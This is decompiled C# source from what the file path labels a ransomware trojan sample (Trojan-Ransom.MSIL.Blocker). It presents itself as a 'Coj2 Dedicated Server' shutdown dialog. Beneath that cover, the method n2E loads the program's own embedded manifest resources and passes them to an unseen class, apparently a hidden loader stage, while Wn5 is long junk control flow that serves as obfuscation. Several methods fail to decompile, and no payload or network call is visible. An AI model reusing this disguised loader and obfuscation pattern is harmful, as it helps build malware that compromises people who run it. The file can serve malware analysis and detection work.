// Decompiled with JetBrains decompiler
// Type: Re3.n8A
// Assembly: Ta5, Version=2.6.1.0, Culture=neutral, PublicKeyToken=null
// MVID: 9F2E64AE-B66A-489E-BB50-4D7BB52F0C28
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.05\HEUR-Trojan-Ransom.MSIL.Blocker.gen-af6e8234a2211a8b50c4e4de3f8a268b3ee98cb6bdc94959c4f1cc88ab8e3b66.exe

using Ak9;
using Ar7;
using e6AW;
using Ek3;
using j7JG;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using o5T;
using p0J;
using q4J;
using Qf0;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Yb6;
using Zc7;

namespace Re3
{
  [DesignerGenerated]
  public class n8A : Form
  {
    private IContainer components;
    private const int WM_CHAR = 258;
    private const int EM_GETLINE = 196;
    private const int EM_GETLINECOUNT = 186;
    private bool btnApagadoPulsado;
    private int countDown;
    private double SumaBarra;
    private double Rojo;
    private double Verde;
    private double SumaResta;
    private object frmConsola;
    private object FrmMain;
    private bool CerrarServidor;

    public n8A()
    {
      this.FormClosing += new FormClosingEventHandler(this.Nx9);
      this.Load += new EventHandler(this.Bw8);
      this.Shown += new EventHandler(this.z4L);
      this.btnApagadoPulsado = false;
      this.countDown = 85;
      this.SumaBarra = 0.0;
      this.Rojo = (double) byte.MaxValue;
      this.Verde = 30.0;
      this.SumaResta = (this.Rojo - this.Verde) / (double) checked (this.countDown - 30);
      this.j4E();
    }

    [DebuggerNonUserCode]
    protected virtual void Dr6(bool Wx8)
    {
      try
      {
        if (!Wx8 || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        this.Dispose(Wx8);
      }
    }

    [DebuggerStepThrough]
    private void j4E()
    {
      this.components = (IContainer) new System.ComponentModel.Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (n8A));
      this.Label1 = new Label();
      this.btnShutdown = new Button();
      this.btnCancel = new Button();
      this.Timershutdown = new Timer(this.components);
      this.PanelProgresBar = new Panel();
      this.lblProgressBarr = new Label();
      this.PanelProgresBar.SuspendLayout();
      this.SuspendLayout();
      this.Label1.Font = new Font("Playbill", 18.15652f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.Label1.ForeColor = Color.FromArgb(100, 70, 30);
      this.Label1.Location = new Point(2, 28);
      this.Label1.Name = "Label1";
      this.Label1.Size = new Size(454, 35);
      this.Label1.TabIndex = 0;
      this.Label1.Text = "Coj2 Dedicated Server is running!!!";
      this.Label1.TextAlign = ContentAlignment.MiddleCenter;
      this.btnShutdown.AutoSize = true;
      this.btnShutdown.BackColor = Color.Firebrick;
      this.btnShutdown.Font = new Font("Segoe UI", 8.139131f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.btnShutdown.ForeColor = SystemColors.ControlLight;
      this.btnShutdown.Location = new Point(65, 132);
      this.btnShutdown.Margin = new Padding(3, 2, 3, 2);
      this.btnShutdown.Name = "btnShutdown";
      this.btnShutdown.Size = new Size(139, 35);
      this.btnShutdown.TabIndex = 29;
      this.btnShutdown.Text = "Shutdown (10s)";
      this.btnShutdown.UseVisualStyleBackColor = false;
      this.btnCancel.AutoSize = true;
      this.btnCancel.BackColor = Color.OliveDrab;
      this.btnCancel.Font = new Font("Segoe UI", 8.139131f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.btnCancel.ForeColor = SystemColors.ControlLight;
      this.btnCancel.Location = new Point(253, 132);
      this.btnCancel.Margin = new Padding(3, 2, 3, 2);
      this.btnCancel.Name = "btnCancel";
      this.btnCancel.Size = new Size(139, 35);
      this.btnCancel.TabIndex = 30;
      this.btnCancel.Text = "Cancel";
      this.btnCancel.UseVisualStyleBackColor = false;
      this.PanelProgresBar.BackColor = SystemColors.ControlLight;
      this.PanelProgresBar.BorderStyle = BorderStyle.FixedSingle;
      this.PanelProgresBar.Controls.Add((Control) this.lblProgressBarr);
      this.PanelProgresBar.Location = new Point(67, 88);
      this.PanelProgresBar.Name = "PanelProgresBar";
      this.PanelProgresBar.Size = new Size(324, 19);
      this.PanelProgresBar.TabIndex = 32;
      this.lblProgressBarr.BackColor = Color.FromArgb((int) byte.MaxValue, 30, 30);
      this.lblProgressBarr.Location = new Point(0, 0);
      this.lblProgressBarr.Name = "lblProgressBarr";
      this.lblProgressBarr.Size = new Size(51, 17);
      this.lblProgressBarr.TabIndex = 0;
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(459, 213);
      this.Controls.Add((Control) this.PanelProgresBar);
      this.Controls.Add((Control) this.btnCancel);
      this.Controls.Add((Control) this.btnShutdown);
      this.Controls.Add((Control) this.Label1);
      this.Font = new Font("Segoe UI", 8.139131f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.FormBorderStyle = FormBorderStyle.FixedDialog;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MaximizeBox = false;
      this.MaximumSize = new Size(475, 252);
      this.MinimizeBox = false;
      this.MinimumSize = new Size(475, 252);
      this.Name = "frmClosingServer";
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Closing Server...";
      this.PanelProgresBar.ResumeLayout(false);
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    [field: AccessedThroughProperty("Label1")]
    internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button btnShutdown
    {
      get => this._btnShutdown;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Dw5);
        Button btnShutdown1 = this._btnShutdown;
        if (btnShutdown1 != null)
          btnShutdown1.Click -= eventHandler;
        this._btnShutdown = value;
        Button btnShutdown2 = this._btnShutdown;
        if (btnShutdown2 == null)
          return;
        btnShutdown2.Click += eventHandler;
      }
    }

    internal virtual Button btnCancel
    {
      get => this._btnCancel;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.e1Z);
        Button btnCancel1 = this._btnCancel;
        if (btnCancel1 != null)
          btnCancel1.Click -= eventHandler;
        this._btnCancel = value;
        Button btnCancel2 = this._btnCancel;
        if (btnCancel2 == null)
          return;
        btnCancel2.Click += eventHandler;
      }
    }

    internal virtual Timer Timershutdown
    {
      get => this._Timershutdown;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.t0S);
        Timer timershutdown1 = this._Timershutdown;
        if (timershutdown1 != null)
          timershutdown1.Tick -= eventHandler;
        this._Timershutdown = value;
        Timer timershutdown2 = this._Timershutdown;
        if (timershutdown2 == null)
          return;
        timershutdown2.Tick += eventHandler;
      }
    }

    [field: AccessedThroughProperty("PanelProgresBar")]
    internal virtual Panel PanelProgresBar { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("lblProgressBarr")]
    internal virtual Label lblProgressBarr { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [DllImport("user32", EntryPoint = "FindWindowA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

    [DllImport("user32", EntryPoint = "PostMessageA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int PostMessage(int hwnd, int wMsg, int wParam, int lParam);

    [DllImport("user32", EntryPoint = "SendMessageA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SendMessageSTRING(int hwnd, int wMsg, int wParam, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lParam);

    [DllImport("user32", EntryPoint = "SendMessageA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int SendMessageAsLong(int hWnd, int wMsg, int wParam, int lParam);

    [DllImport("user32", EntryPoint = "FindWindowExA", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern int FindWindowEx(
      int hWnd1,
      int hWnd2,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpsz1,
      [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpsz2);

    private void e1Z(object k2M, EventArgs Ng5)
    {
      this.CerrarServidor = false;
      this.Close();
      this.Dispose();
    }

    private void Dw5(object j8B, EventArgs Li8)
    {
      this.btnShutdown.Enabled = false;
      this.btnCancel.Enabled = false;
      this.SumaBarra = (double) checked (this.PanelProgresBar.Width - 2) / 80.0;
      this.btnApagadoPulsado = true;
      this.Timershutdown.Enabled = true;
      this.Label1.Text = "Coj2 Dedicated Server is shutting down";
      this.Timershutdown.Enabled = true;
      string str1 = "/servershutdown";
      string str2 = "ConsoleWindowClass";
      ref string local1 = ref str2;
      string str3 = (string) null;
      ref string local2 = ref str3;
      int window = n8A.FindWindow(ref local1, ref local2);
      int num = Strings.Len(str1);
      int Start = 1;
      string str4;
      while (Start <= num)
      {
        int hwnd = window;
        int wParam = Strings.Asc(Strings.Mid(str1, Start, 1));
        str4 = Conversions.ToString(0L);
        ref string local3 = ref str4;
        n8A.SendMessageSTRING(hwnd, 258, wParam, ref local3);
        checked { ++Start; }
      }
      int hwnd1 = window;
      str4 = Conversions.ToString(0L);
      ref string local4 = ref str4;
      n8A.SendMessageSTRING(hwnd1, 258, 13, ref local4);
      int hwnd2 = window;
      str4 = Conversions.ToString(0L);
      ref string local5 = ref str4;
      n8A.SendMessageSTRING(hwnd2, 258, 10, ref local5);
      this.CerrarServidor = true;
    }

    private void Nx9(object o8C, FormClosingEventArgs a7E)
    {
      if (!this.btnApagadoPulsado)
        a7E.Cancel = true;
      else
        this.Dispose();
    }

    private void t0S(object g8Q, EventArgs y0B)
    {
      if (this.countDown < 55)
      {
        this.Rojo -= this.SumaResta;
        this.Verde += this.SumaResta;
      }
      if (this.countDown == -1)
      {
        this.Timershutdown.Enabled = false;
        this.Close();
        this.Dispose();
        NewLateBinding.LateCall(this.FrmMain, (System.Type) null, "Show", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      }
      else
      {
        NewLateBinding.LateCall(this.FrmMain, (System.Type) null, "Hide", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
        if (this.Verde < 256.0)
          this.lblProgressBarr.BackColor = Color.FromArgb(checked ((int) Conversion.Int(this.Rojo)), checked ((int) Conversion.Int(this.Verde)), 30);
        this.lblProgressBarr.Width = checked ((int) Math.Round(unchecked ((double) this.lblProgressBarr.Width + Conversion.Int(this.SumaBarra))));
        if (Operators.CompareString(Strings.Mid(this.countDown.ToString().Trim(), 2, 1), "0", false) == 0)
        {
          this.Label1.Text += ".";
          this.btnShutdown.Text = "Shutdown (" + ((double) this.countDown / 10.0).ToString().Trim() + ")";
        }
        checked { --this.countDown; }
      }
    }

    private void Bw8(object Pz7, EventArgs j1A) => this.lblProgressBarr.Width = 0;

    private void z4L(object g9C, EventArgs Gd3)
    {
      NewLateBinding.LateCall(this.FrmMain, (System.Type) null, "Hide", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
      NewLateBinding.LateCall(this.frmConsola, (System.Type) null, "Hide", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
    }

    [STAThread]
    public static void n2E()
    {
      try
      {
        List<object> s9Y = new List<object>();
        int count1 = s9Y.Count;
        while (count1 <= 0)
        {
          checked { ++count1; }
          s9Y.Add((object) count1);
        }
        s9Y.Add((object) Assembly.LoadFrom(Application.ExecutablePath));
        s9Y.Add(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(s9Y[1], (System.Type) null, "GetManifestResourceNames", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)));
        if (s9Y[2] == null || s9Y.Count <= 2)
          return;
        a3Y.c3R(s9Y);
        int count2 = s9Y.Count;
        if (count2 > 0)
        {
          int num = checked (count2 * 25 * 25);
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    static void Wn5()
    {
      UIntPtr num1 = new UIntPtr();
      e8C e8C;
      Ab4 ab4_1;
      // ISSUE: variable of a compiler-generated type
      j6Q j6Q1;
      if ((IntPtr) new UIntPtr() == IntPtr.Zero)
      {
        try
        {
          try
          {
            e8C = (e8C) j6Q.Default;
          }
          finally
          {
            ab4_1 = (Ab4) null;
            goto label_8;
          }
        }
        catch
        {
          while (null != null)
          {
            Ry0 ry0 = (Ry0) j6Q.Default;
          }
        }
      }
      else
      {
        // ISSUE: variable of a compiler-generated type
        j6Q j6Q2 = j6Q.Default;
        j6Q1 = j6Q2;
      }
label_8:
      d3D6 d3D6_1 = (d3D6) j6Q.Default;
      d3D6 d3D6_2 = d3D6_2;
      d3D6_2 = (d3D6) null;
      q4H9 q4H9_1 = (q4H9) j6Q.Default;
      q4H9 q4H9_2 = (q4H9) null;
      q4H9 q4H9_3 = q4H9_1;
      q4H9 q4H9_4 = (q4H9) j6Q.Default;
      // ISSUE: variable of a compiler-generated type
      Xy3 xy3_1;
      // ISSUE: variable of a compiler-generated type
      Xy3 xy3_2;
      object obj;
      while (true)
      {
        obj = (object) null;
        if (obj != null)
        {
          try
          {
            n8A n8A = (n8A) j6Q.Default;
          }
          catch
          {
            // ISSUE: variable of a compiler-generated type
            Xy3 xy3_3 = (Xy3) j6Q.Default;
            xy3_2 = xy3_1;
            xy3_1 = xy3_3;
          }
          finally
          {
            ab4_1 = (Ab4) null;
            goto label_13;
          }
label_13:;
        }
        else
          break;
      }
      Dd8 dd8_1;
      Dd8 dd8_2;
      do
      {
        while (null != null)
        {
          try
          {
            q4H9 q4H9_5 = (q4H9) j6Q.Default;
          }
          catch
          {
            Dd8 dd8_3 = (Dd8) j6Q.Default;
            dd8_2 = dd8_1;
            dd8_1 = dd8_3;
            Ab4 ab4_2 = (Ab4) j6Q.Default;
          }
        }
      }
      while (obj != null);
      try
      {
        if ((UIntPtr) j6Q.Default == null)
        {
          try
          {
            e8C = (e8C) j6Q.Default;
            xy3_2 = xy3_1;
          }
          finally
          {
            Ry0 ry0 = (Ry0) j6Q.Default;
            goto label_32;
          }
        }
        else if ((IntPtr) new UIntPtr() == IntPtr.Zero)
        {
          // ISSUE: variable of a compiler-generated type
          c0W c0W = (c0W) j6Q.Default;
        }
        else
        {
          Ab4 ab4_3 = (Ab4) j6Q.Default;
        }
      }
      catch
      {
        try
        {
          do
          {
            ab4_1 = (Ab4) null;
          }
          while (null != null);
        }
        catch
        {
          if ((UIntPtr) j6Q.Default == null)
          {
            Dd8 dd8_4 = (Dd8) j6Q.Default;
          }
        }
      }
label_32:
      // ISSUE: variable of a compiler-generated type
      Xy3 xy3_4 = (Xy3) j6Q.Default;
      n8A n8A1;
      Ry0 ry0_1;
      Ry0 ry0_2;
      try
      {
        do
        {
          try
          {
            Ab4 ab4_4 = (Ab4) j6Q.Default;
            n8A1 = (n8A) j6Q.Default;
            j6Q1 = j6Q1;
            ry0_1 = (Ry0) j6Q.Default;
            ry0_2 = (Ry0) null;
          }
          finally
          {
            t3T t3T = (t3T) j6Q.Default;
            goto label_37;
          }
label_37:;
        }
        while (null != null);
      }
      finally
      {
        Ry0 ry0_3 = (Ry0) j6Q.Default;
        goto label_39;
      }
label_39:
      t3T t3T1 = (t3T) j6Q.Default;
      UIntPtr num2;
      // ISSUE: variable of a compiler-generated type
      c0W c0W1;
      try
      {
        num2 = new UIntPtr();
        if ((IntPtr) checked (num2 * num2) == IntPtr.Zero)
        {
          while (obj != null)
            n8A1 = (n8A) null;
        }
      }
      finally
      {
        try
        {
          // ISSUE: variable of a compiler-generated type
          c0W c0W2 = c0W1;
          c0W1 = c0W2;
          goto label_46;
        }
        catch
        {
          // ISSUE: variable of a compiler-generated type
          Xy3 xy3_5 = (Xy3) j6Q.Default;
          goto label_46;
        }
      }
label_46:
      try
      {
        while ((object) j6Q.Default != null)
        {
          while (obj != null)
            d3D6_2 = (d3D6) null;
        }
      }
      catch
      {
        do
        {
          if ((UIntPtr) j6Q.Default == null)
          {
            q4H9 q4H9_6 = (q4H9) j6Q.Default;
          }
        }
        while (obj != null);
      }
      while (obj != null)
      {
        try
        {
          num2 = new UIntPtr();
          if ((IntPtr) num2 == IntPtr.Zero)
          {
            dd8_1 = dd8_1;
          }
          else
          {
            ry0_2 = (Ry0) j6Q.Default;
            // ISSUE: variable of a compiler-generated type
            j6Q j6Q3 = j6Q.Default;
            e8C = e8C;
          }
        }
        finally
        {
          try
          {
            n8A n8A2 = (n8A) j6Q.Default;
            goto label_61;
          }
          catch
          {
            dd8_1 = dd8_1;
            goto label_61;
          }
        }
label_61:;
      }
      // ISSUE: variable of a compiler-generated type
      Xy3 xy3_6 = (Xy3) j6Q.Default;
      try
      {
        if ((IntPtr) num2 == IntPtr.Zero)
        {
          dd8_2 = dd8_1;
          Ab4 ab4_5 = (Ab4) j6Q.Default;
          n8A1 = (n8A) j6Q.Default;
          n8A n8A3 = (n8A) j6Q.Default;
        }
      }
      catch
      {
        do
        {
          UIntPtr num3 = new UIntPtr();
          UIntPtr num4 = new UIntPtr();
          UIntPtr num5 = num4;
          if ((IntPtr) (checked (num3 - num5) / num4) == IntPtr.Zero)
          {
            Ab4 ab4_6 = (Ab4) j6Q.Default;
          }
          else
          {
            ry0_2 = (Ry0) null;
            d3D6_2 = (d3D6) j6Q.Default;
          }
        }
        while ((object) j6Q.Default != null);
      }
      try
      {
        while (null != null)
        {
          try
          {
            q4H9_3 = q4H9_3;
          }
          catch
          {
            n8A n8A4 = (n8A) j6Q.Default;
            q4H9_3 = (q4H9) j6Q.Default;
          }
        }
      }
      finally
      {
        UIntPtr num6;
        try
        {
          num6 = new UIntPtr();
          if ((IntPtr) num6 == IntPtr.Zero)
          {
            q4H9_2 = q4H9_3;
            t3T t3T2 = (t3T) j6Q.Default;
            goto label_84;
          }
          else
          {
            n8A n8A5 = (n8A) j6Q.Default;
            goto label_84;
          }
        }
        finally
        {
          if ((IntPtr) num6 == IntPtr.Zero)
          {
            ry0_2 = ry0_2;
            goto label_84;
          }
          else
          {
            dd8_2 = (Dd8) j6Q.Default;
            goto label_84;
          }
        }
      }
label_84:
      ry0_1 = ry0_2;
      UIntPtr num7 = new UIntPtr();
      if ((IntPtr) num7 == IntPtr.Zero)
      {
        do
        {
          if ((IntPtr) num7 == IntPtr.Zero)
          {
            // ISSUE: variable of a compiler-generated type
            j6Q j6Q4 = j6Q.Default;
          }
        }
        while ((object) j6Q.Default != null);
      }
      if ((IntPtr) num7 == IntPtr.Zero)
      {
        // ISSUE: variable of a compiler-generated type
        Xy3 xy3_7 = (Xy3) j6Q.Default;
      }
      a3Y a3Y = (a3Y) j6Q.Default;
      Ry0 ry0_4 = (Ry0) j6Q.Default;
      t3T t3T3 = (t3T) j6Q.Default;
      if ((IntPtr) num7 == IntPtr.Zero)
      {
        try
        {
          Dd8 dd8_5 = (Dd8) j6Q.Default;
          ry0_1 = (Ry0) j6Q.Default;
          dd8_2 = (Dd8) null;
          c0W1 = (c0W) j6Q.Default;
        }
        catch
        {
          if ((UIntPtr) j6Q.Default == null)
          {
            q4H9 q4H9_7 = (q4H9) j6Q.Default;
            Ab4 ab4_7 = (Ab4) j6Q.Default;
            Dd8 dd8_6 = (Dd8) j6Q.Default;
          }
          else
          {
            Ry0 ry0_5 = (Ry0) j6Q.Default;
          }
        }
      }
      else
      {
        do
        {
          if ((UIntPtr) j6Q.Default == null)
          {
            // ISSUE: variable of a compiler-generated type
            j6Q j6Q5 = j6Q.Default;
          }
        }
        while (obj != null);
      }
    }

    static void Wg2()
    {
      // ISSUE: unable to decompile the method.
    }

    static void Jz8()
    {
      // ISSUE: unable to decompile the method.
    }

    static void Mj6()
    {
      // ISSUE: unable to decompile the method.
    }
  }
}
